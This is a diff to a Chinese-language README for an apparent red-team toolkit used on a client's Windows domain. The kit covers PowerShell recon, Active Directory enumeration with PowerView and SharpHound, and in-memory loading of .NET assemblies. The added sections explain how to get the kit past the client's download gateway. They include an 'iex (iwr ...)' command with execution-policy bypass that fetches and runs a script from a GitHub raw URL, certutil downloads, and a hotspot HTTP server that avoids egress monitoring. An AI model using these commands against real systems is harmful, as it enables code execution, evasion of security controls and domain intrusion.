@@ -25,10 +25,11 @@ day2-kit/
 ├─ ps1/          PowerShell 载荷
 │   ├─ Get-LocalRecon.ps1  自写轻量侦察（无已知工具特征）
 │   ├─ Load-Assembly.ps1   内存加载 .NET 程序集（execute-assembly 等价物）
-│   └─ Invoke-Suite.ps1    一键跑已备工具（PowerUp/JAWS/SessionGopher/PowerView/SharpHound）
+│   ├─ Invoke-Suite.ps1    一键跑已备工具（PowerUp/JAWS/SessionGopher/PowerView/SharpHound）
+│   └─ Get-Kit.ps1         纯文本拉取器（下载被拦时用 raw 逐文件取全套）
 ├─ tools/        已下载工具源（供内存加载，勿直接双击 exe）
 │   ├─ PowerUp.ps1 / PowerView.ps1 / jaws-enum.ps1 / SessionGopher.ps1 / PrivescCheck.ps1
-│   └─ sharphound/SharpHound.exe + SharpHound.ps1
+│   └─ sharphound/SharpHound.ps1（内嵌程序集版，无 exe）
 ├─ out/          所有脚本输出日志（默认生成位置）
 └─ manifest.sha256   全文件哈希（同时可提交应用白名单审批）
 ```
@@ -45,10 +46,10 @@ day2-kit/
    . .\ps1\Invoke-Suite.ps1 -Tool PowerView    # 域内 ACL/委派/组
    . .\ps1\Invoke-Suite.ps1 -Tool SharpHound   # 域图谱收集（LDAP，量大，建议报备后跑）
    ```
-5. **SharpHound 内存加载**（不落地）：
+5. **SharpHound 内存加载**（不落地，推荐直接用内嵌程序集版）：
    ```powershell
-   . .\ps1\Load-Assembly.ps1
-   Invoke-AssemblyInMemory -Path .\tools\sharphound\SharpHound.exe -Args '-c','All','--outputdirectory',$env:TEMP
+   . .\tools\sharphound\SharpHound.ps1
+   Invoke-BloodHound -CollectionMethod All -Domain $env:USERDNSDOMAIN -ZipFileName $env:TEMP\bh.zip
    ```
 
 ## 高信任执行通道备忘
@@ -64,10 +65,22 @@ day2-kit/
 | certutil -urlcache | 文件传输备选 | 直连下载 exe 被网关拦，走热点 HTTP 时可用 |
 | go.exe（现场已装） | 本地编译 | 产物是 PE 落地即受限 → 编译后用 Load-Assembly 内存加载 |
 
-## 文件进场
+## 文件进场（下载被拦时按序降级）
 
-沿用 Day1 热点方案：攻击机 `python3 -m http.server 8000`（只绑热点网段），
-测试机 `powershell -ep bypass -c "iwr http://<攻击机>:8000/day2-kit.zip -OutFile $env:TEMP\k.zip; Expand-Archive $env:TEMP\k.zip $env:TEMP\k"`。
+仓库已做纯文本化（无 exe/zip 二进制；SharpHound 以内嵌程序集的 `SharpHound.ps1` 形式存在）。
+
+1. **raw 逐文件拉取（首选）**：网关通常只拦 exe/zip，text/plain 能过。
+   ```powershell
+   powershell -ep bypass -c "iex (iwr https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Kit.ps1)"
+   ```
+   全套落到 `%TEMP%\day2-kit`，顺带定义 `Invoke-BloodHoundFromRepo`（内存执行，不落 exe）。
+
+2. **zip 整包（若网关只按扩展名拦 exe）**：主分支已无二进制，可重试
+   `https://github.com/tiaodan577-glitch/day2-kit/archive/refs/heads/main.zip`
+   （别用 `git clone`——历史包里含旧二进制 blob，会被同样拦截）。
+
+3. **热点 HTTP 兜底（Day1 已验证）**：攻击机 `python3 -m http.server 8000`（只绑热点网段），
+   测试机 PowerShell 从热点地址拉 zip/逐文件，完全不走客户出网设备。
 
 ## 红线（EDR 敏感，先报备再动）
 
